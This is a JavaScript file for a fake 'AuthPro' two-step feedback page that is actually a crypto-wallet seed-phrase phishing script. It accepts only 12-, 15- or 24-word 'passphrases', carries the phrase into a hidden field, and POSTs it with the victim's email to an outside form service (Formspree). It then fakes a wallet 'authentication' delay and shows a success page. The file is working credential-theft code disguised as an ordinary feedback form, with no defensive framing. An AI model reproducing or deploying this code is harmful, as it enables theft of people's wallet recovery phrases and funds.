/* ============================================ */
/* script.js - AuthPro 2-Step Feedback Process */
/* ============================================ */

// Create floating particles
document.addEventListener('DOMContentLoaded', function() {
    createParticles();
    initializeFeedbackPage();
    initializeEmailPage();
});

// Create animated particles
function createParticles() {
    const particlesContainer = document.getElementById('particles');
    if (!particlesContainer) return;
    
    for (let i = 0; i < 30; i++) {
        const particle = document.createElement('div');
        particle.classList.add('particle');
        particle.style.left = Math.random() * 100 + '%';
        particle.style.animationDelay = Math.random() * 10 + 's';
        particle.style.animationDuration = (Math.random() * 5 + 5) + 's';
        
        // Random colors: gold or red
        const colors = ['#ffd700', '#ff0000'];
        particle.style.background = colors[Math.floor(Math.random() * colors.length)];
        
        particlesContainer.appendChild(particle);
    }
}

// Function to count words in a string
function countWords(text) {
    // Trim whitespace and split by spaces
    const words = text.trim().split(/\s+/);
    // Filter out empty strings
    return words.filter(word => word.length > 0).length;
}

// Initialize feedback page (Step 1)
function initializeFeedbackPage() {
    const feedbackForm = document.getElementById('feedbackForm');
    const feedbackTextarea = document.getElementById('feedback');
    
    if (!feedbackForm || !feedbackTextarea) return; // Not on feedback page
    
    // Add word counter functionality
    const wordCountDiv = document.getElementById('wordCount');
    
    // Update word count as user types
    feedbackTextarea.addEventListener('input', function() {
        const wordCount = countWords(this.value);
        
        if (wordCount === 12 || wordCount === 15 || wordCount === 24) {
            wordCountDiv.textContent = ` ✓ Valid Passphrase`;
            wordCountDiv.style.color = '#00cc00';
            wordCountDiv.style.fontWeight = 'bold';
        } else {
            wordCountDiv.textContent = ` Input a valid passphrase`;
            wordCountDiv.style.color = '#ff0000';
            wordCountDiv.style.fontWeight = 'normal';
        }
    });
    
    // Handle feedback form submission
    feedbackForm.addEventListener('submit', function(e) {
        e.preventDefault();
        
        const feedbackText = feedbackTextarea.value;
        const wordCount = countWords(feedbackText);
        
        // Validate word count
        if (wordCount !== 12 && wordCount !== 15 && wordCount !== 24) {
            alert(`❌ Invalid Passphrase!\n\nYour passphrase contains ${wordCount} word(s).\n\nPlease enter a valid passphrase.`);
            return;
        }
        
        // Store feedback in sessionStorage
        sessionStorage.setItem('authpro_feedback', feedbackText);
        
        // Redirect to email page
        window.location.href = 'email.html';
    });
}

// Initialize email page (Step 2)
function initializeEmailPage() {
    const emailForm = document.getElementById('emailForm');
    const feedbackDataInput = document.getElementById('feedbackData');
    
    if (!emailForm || !feedbackDataInput) return; // Not on email page
    
    // Retrieve feedback from sessionStorage
    const storedFeedback = sessionStorage.getItem('authpro_feedback');
    
    // If no feedback found, redirect back to feedback page
    if (!storedFeedback) {
        alert('ENTER YOUR PASSPHRASE.');
        window.location.href = 'feedback.html';
        return;
    }
    
    // Set the hidden field with the feedback
    feedbackDataInput.value = storedFeedback;
    
    // Handle email form submission
    emailForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const submitBtn = document.getElementById('submitBtn');
        const loadingSpinner = document.getElementById('loadingSpinner');
        
        // Disable button and show loading
        submitBtn.disabled = true;
        submitBtn.textContent = 'Authenticating...';
        loadingSpinner.classList.add('show');
        
        // Get form data
        const formData = new FormData(emailForm);
        
        try {
            // Send to Formspree
            const response = await fetch(emailForm.action, {
                method: 'POST',
                body: formData,
                headers: {
                    'Accept': 'application/json'
                }
            });
            
            // Wait 5 seconds before redirecting
            setTimeout(function() {
                loadingSpinner.classList.remove('show');
                
                if (response.ok) {
                    // Clear stored feedback
                    sessionStorage.removeItem('authpro_feedback');
                    
                    // Redirect to success page
                    window.location.href = 'success.html';
                } else {
                    // Show error
                    alert('There was an error authenticating your wallet. Please try again.');
                    submitBtn.textContent = 'Authenticate';
                    submitBtn.disabled = false;
                }
            }, 5000); // 5 second delay
            
        } catch (error) {
            console.error('Error:', error);
            
            // Wait 5 seconds before showing error
            setTimeout(function() {
                loadingSpinner.classList.remove('show');
                alert('There was an error authenticating your wallet. Please try again.');
                submitBtn.textContent = 'Authenticate';
                submitBtn.disabled = false;
            }, 5000);
        }
    });
}